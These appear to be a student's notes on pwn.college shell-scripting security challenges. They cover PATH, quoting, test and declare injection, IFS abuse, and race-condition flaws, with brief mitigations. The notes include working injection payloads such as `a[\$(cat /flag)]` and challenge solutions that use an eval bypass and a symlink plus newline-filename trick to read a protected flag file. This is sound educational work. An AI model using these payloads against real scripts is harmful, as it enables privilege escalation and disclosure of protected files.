# Module 1
## Environment Attack
### Vuln:
- abuse `PATH` variable

### Mit: 
- use absolute path in script (`unset PATH` does not solve the problem) 

## Race Condition, Symlink Attack
- Do not use `$0`.

---

# Module 2
## Shell Expansion
### Vuln:
- lacking quotes(examples: `$1`, `[A-Z]`, `$*`)

### Mit:
- use quotes

## Test Injection + Expansion
### Vuln:
- ```sh
  [ $1 -eq "$CHALLENGE" ]

## declare not safe
### Vuln:
- ```sh
  declare -- "$1"="$2"`
- abuse `IFS` variable

### Mit: 
- try sanitizing arguments

## Array Attack, Process Substitution, Abusing -eq
- `a[\$(cat /flag)]`

## Race Condition(again)
- Do not use `$0`.

## Subshell Attack with extra bracket
- `a[\$(</flag))]` (extra ')')

---

# Module 3
## Rhythm of Restriction

```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$INPUT"
```

### Solution
```sh
/challenge/run /bin/bash
$@
```

# Module 4
## Dance of the Disguised
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin
[ -n "$1" ] || exit 1

WORKDIR=$(mktemp -d) || exit 2
cp -rL "$1"/* $WORKDIR/files
cd $WORKDIR/files

# make sure there weren't linking shenanegans
grep -q "{" notflag* && exit 3

ls notflag* | while read FILE
do
	echo "###### FILE: $FILE #######"
	cat "$FILE"
done
```

### Vulnerability
`ls notflag* | while read FILE`

### Solution
- Create file with `\n` in it
```sh
ln -s /flag a
touch $'notflag\na'
```

